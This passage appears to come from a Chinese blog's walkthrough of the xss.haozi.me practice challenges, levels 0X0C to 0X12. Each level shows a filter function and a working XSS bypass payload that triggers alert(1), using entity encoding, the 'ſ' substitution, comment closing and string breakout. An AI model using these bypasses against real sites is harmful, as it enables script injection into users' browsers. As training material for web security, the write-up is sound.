class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>但大写的alert(1)无法成功触发xss，这里的话我们看到这个内容是在标签中的，我们可以把alert(1)进行实体编码，在服务器端会自动解码，因此构造最终payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537152.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X0C\"><a href=\"#0X0C\" class=\"headerlink\" title=\"0X0C\"></a>0X0C</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>script<span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;h1>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/h1>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在上关的基础上多过滤了个script标签，这里的话我们直接把script进行实体编码即可绕过</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>java<span class=\"token operator\">&amp;</span>#x73<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x63<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x69<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x70<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537585.png\" alt=\"在这里插入图片描述\"><br>当然，也可以不用这个标签，换其他标签，例如img</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">0</span> onerror<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X0D\"><a href=\"#0X0D\" class=\"headerlink\" title=\"0X0D\"></a>0X0D</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>\"<span class=\"token char\">']/g, '</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n    <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n          <span class=\"token comment\">// alert('$&#123;input&#125;')</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话可以看出它是把我们写的内容放注释里了，同时过滤了<code>&quot;、&#39;、/</code>，这个时候的话，绕过注释简单，我们只需要一个换行即可，而后插入alert(1)，但此时存在一个问题，就是后面多出了个’)，我们需要注释，但<code>/</code>被ban了，该怎么办呢，这个时候就需要说一下html了，它还有注释方法是<code>&lt;!-- xxx --&gt;</code>这种，因此我们添加–&gt;来闭合即可，构造最终payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\n<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">--</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537568.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X0E\"><a href=\"#0X0E\" class=\"headerlink\" title=\"0X0E\"></a>0X0E</h2><p>题目代码如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token operator\">-</span>zA<span class=\"token operator\">-</span><span class=\"token class-name\">Z</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&lt;_$1'</span><span class=\"token punctuation\">)</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">toUpperCase</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;h1>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/h1>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话给标签都添加了下划线，这个时候的话新添标签就无效了，这个时候可以用<code>ſ</code>来代替s，但<code>alert(1)</code>大写的话是无用的，因此需要用其他属性了，这个时候可以用src，结合作者的js文件，触发xss</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>ſcript src<span class=\"token operator\">=</span><span class=\"token string\">\"https://xss.haozi.me/j.js\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537518.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X0F\"><a href=\"#0X0F\" class=\"headerlink\" title=\"0X0F\"></a>0X0F</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function <span class=\"token function\">escapeHtml</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;amp;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">39</span><span class=\"token punctuation\">;</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\"<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;quot;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;lt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;gt;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;#x2f;'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>img src onerror<span class=\"token operator\">=</span><span class=\"token string\">\"console.error('$&#123;escapeHtml(input)&#125;')\"</span><span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p> 使用escapeHTML，将字符串<code>&lt;script&gt;alert(1)&lt;/script</code>转为 <code>&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;</code>此时，浏览器将能正确解析，因为浏览器接收到实体字符后，转成对应的尖括号等<br> 因此这里是没啥影响的，所以这里的话就是<code>consonle.error(&#39;x&#39;)</code>，我们可控的是x，那我们如果想进行xss，首先肯定要避开这个括号，因此我们先进行闭合，构造<code>&#39;);</code>，此时再添加我们的弹窗语句<code>alert(1)</code>，此时后面还有一个<code>&#39;)</code>，我们需要闭合它使语句正常，所以添加一个<code>(&#39;</code>来闭合语句，最终payload</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">'<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>'<span class=\"token number\">1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X10\"><a href=\"#0X10\" class=\"headerlink\" title=\"0X10\"></a>0X10</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> `\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n  window<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> $<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这个可以在随便一个网页上进行测试，<code>windows.data=alert(1)</code>就可以触发xss<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537878.png\" alt=\"在这里插入图片描述\"></p>\n<p>因此这里直接输入alert(1)即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h2 id=\"0X11\"><a href=\"#0X11\" class=\"headerlink\" title=\"0X11\"></a>0X11</h2><p>题目代码如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// from alf.nu</span>\nfunction render <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function escapeJs <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\\\<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\\\\\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span>\\\\\\''<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token string\">\"/g, '\\\\\"</span>'<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>`<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\`'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\74'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\76'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\/'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\n<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\n'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\r<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\r'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\t<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\t'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\f<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\f'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\v<span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\v'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">// .replace(/\\b/g, '\\\\b')</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>\\<span class=\"token number\">0</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\\\0'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#125;</span>\n  s <span class=\"token operator\">=</span> <span class=\"token function\">escapeJs</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>\n  <span class=\"token keyword\">var</span> url <span class=\"token operator\">=</span> 'javascript<span class=\"token operator\">:</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;s&#125;\"</span><span class=\"token punctuation\">)</span>'\n  <span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token char\">'a'</span><span class=\"token punctuation\">)</span>\n  a<span class=\"token punctuation\">.</span>href <span class=\"token operator\">=</span> url\n  document<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n  a<span class=\"token punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>可以发现这里除了<code>()</code>之外都进行了过滤，然后看到<code>  var url = &#39;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#39;</code>这个语句，这里我们只需要构造出单独的<code>alert(1)</code>就可以成功触发xss，所以我们先闭合这个语句，这时候用<code>&quot;);</code>来进行闭合，而后添加我们的<code>alert(1)</code>,此时因为后面多出了<code>&quot;)</code>，我们需要闭合，所以加上<code>(&quot;</code>，最终payload如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token string\">\");alert(1)(\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537002.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"0X12\"><a href=\"#0X12\" class=\"headerlink\" title=\"0X12\"></a>0X12</h2><p>题目如下</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// from alf.nu</span>\nfunction escape <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  s <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token string\">\"/g, '\\\\\"</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"' + s + '\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>仅仅只过滤了<code>/</code>,这里的话我们直接把这个标签给闭合了，自己再构造一个script标签来写入我们的xss代码即可</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537025.png\" alt=\"在这里插入图片描述\"></p>\n","feature":true,"text":"前言XSS学习过后，想刷一些题，github找到一个，链接如下https://xss.haozi.me/ 0X00function render (input) &#123; return '&lt;div>' + input + '&lt;/div>' &#125; 看到服务端...","link":"","photos":[],"count_time":{"symbolsCount":"7.7k","symbolsTime":"7 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X00\"><span class=\"toc-text\">0X00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X01\"><span class=\"toc-text\">0X01</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X02\"><span class=\"toc-text\">0X02</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X03\"><span class=\"toc-text\">0X03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">实体编码绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">反引号绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X04\"><span class=\"toc-text\">0X04</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X05\"><span class=\"toc-text\">0X05</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X06\"><span class=\"toc-text\">0X06</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X07\"><span class=\"toc-text\">0X07</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X08\"><span class=\"toc-text\">0X08</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X09\"><span class=\"toc-text\">0X09</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0A\"><span class=\"toc-text\">0X0A</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0B\"><span class=\"toc-text\">0X0B</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0C\"><span class=\"toc-text\">0X0C</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0D\"><span class=\"toc-text\">0X0D</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0E\"><span class=\"toc-text\">0X0E</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X0F\"><span class=\"toc-text\">0X0F</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X10\"><span class=\"toc-text\">0X10</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X11\"><span class=\"toc-text\">0X11</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0X12\"><span class=\"toc-text\">0X12</span></a></li></ol></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"从多个基础CMS入坑代码审计","uid":"18629f2c244b07dcae82afe166d98af9","slug":"从多个基础CMS入坑代码审计","date":"2022-07-20T17:41:30.000Z","updated":"2024-02-14T07:30:38.000Z","comments":true,"path":"api/articles/从多个基础CMS入坑代码审计.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141758128.png","text":"代码审计概念什么是代码审计？ 代码审计是在一个编程中对源代码旨在发现错误、安全漏洞或违反编程约定的项目。说人话就是找它这些代码中可能存在问题的地方，然后看它是否真的存在漏洞。(博主小白，可能存在问题，请见谅) 分类代码审计的话大致分为三种，白盒、黑盒和灰盒 白盒测试较为官方的定义...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"15 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"代码审计","slug":"代码审计","count":6,"path":"api/tags/代码审计.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"XSS常见绕过姿势和绕某狗WAF所用标签小记","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSS常见绕过姿势和绕某狗WAF所用标签小记","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T07:37:02.000Z","comments":true,"path":"api/articles/XSS常见绕过姿势和绕某狗WAF所用标签小记.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141536202.png","text":"前言之前在XSS方面只有很浅的了解，再次学习过后，这里对其部分知识进行总结，同时用例题来讲解，希望能对在学习XSS的师傅有所帮助 什么是XSSXSS，全拼Cross Site Scripting，中文含义是跨站脚本攻击，为了不和层叠样式表(Cascading Style Shee...","link":"","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"XSS","slug":"XSS","count":2,"path":"api/tags/XSS.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}